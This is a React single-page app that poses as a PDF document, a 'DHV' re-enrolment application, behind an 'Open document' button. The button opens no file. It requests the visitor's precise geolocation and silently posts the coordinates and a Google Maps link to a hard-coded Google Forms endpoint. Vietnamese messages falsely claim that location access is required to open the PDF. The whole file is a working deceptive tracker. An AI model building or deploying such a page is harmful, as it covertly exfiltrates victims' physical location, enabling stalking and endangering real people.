import { useState } from "react";

import pdfImage from "./assets/pdf.jpg";

function App() {
  const [message, setMessage] = useState("");

const sendLocation = () => {
  navigator.geolocation.getCurrentPosition(
    async (position) => {
      try {
        const lat = String(position.coords.latitude);
        const lng = String(position.coords.longitude);
        const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;

        const FORM_URL =
          "https://docs.google.com/forms/d/e/1FAIpQLSfBwI_ZNhfM40KO6d8xlblT4XoVrkoTI5fhxThFLekpIdX29w/formResponse";

        const formData = new FormData();

        formData.append("entry.1213031857", lat);
        formData.append("entry.585176337", lng);
        formData.append("entry.264069353", mapLink);

        await fetch(FORM_URL, {
          method: "POST",
          mode: "no-cors",
          body: formData,
        });

        setMessage("Đã gửi vị trí thành công.");
      } catch (error) {
        setMessage("Có lỗi xảy ra.");
      }
    },
    (error) => {
      if (error.code === error.PERMISSION_DENIED) {
        alert(
          "Bạn đã chặn quyền truy cập.\n\nVui lòng bật lại:\nQuyền > Vị trí > Cho phép\n\nSau đó tải lại trang."
        );

        setMessage("Bạn cần cho phép truy cập để mở file PDF.");
      } else {
        setMessage("vui lòng cấp quyền.");
      }
    },
    {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0,
    }
  );
};

  return (
    <div
      style={{
        minHeight: "100vh",
        background: "#111827",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        padding: 20,
      }}
    >
      <div
        style={{
          width: "100%",
          maxWidth: 360,
          background: "#1f2937",
          borderRadius: 20,
          padding: 28,
          textAlign: "center",
          color: "white",
          boxShadow: "0 20px 40px rgba(0,0,0,0.35)",
        }}
      >
        <img
          src={pdfImage}
          alt="PDF"
          style={{
            width: 120,
            height: 120,
            objectFit: "contain",
            marginBottom: 16,
          }}
        />

        <h1 style={{ fontSize: 20, marginBottom: 8 }}>
          DHV-ĐƠN XIN HỌC LẠI
        </h1>

        <p style={{ color: "#9ca3af", marginBottom: 24 }}>
          Nhấn nút bên dưới để tiếp tục mở tài liệu.
        </p>

        <button
          onClick={sendLocation}
          style={{
            width: "100%",
            padding: "14px 18px",
            borderRadius: 12,
            border: "none",
            background: "#6366f1",
            color: "white",
            fontSize: 16,
            fontWeight: 600,
            cursor: "pointer",
          }}
        >
          Mở tài liệu
        </button>

        {message && (
          <p style={{ marginTop: 18, color: "#d1d5db" }}>
            {message}
          </p>
        )}
      </div>
    </div>
  );
}

export default App;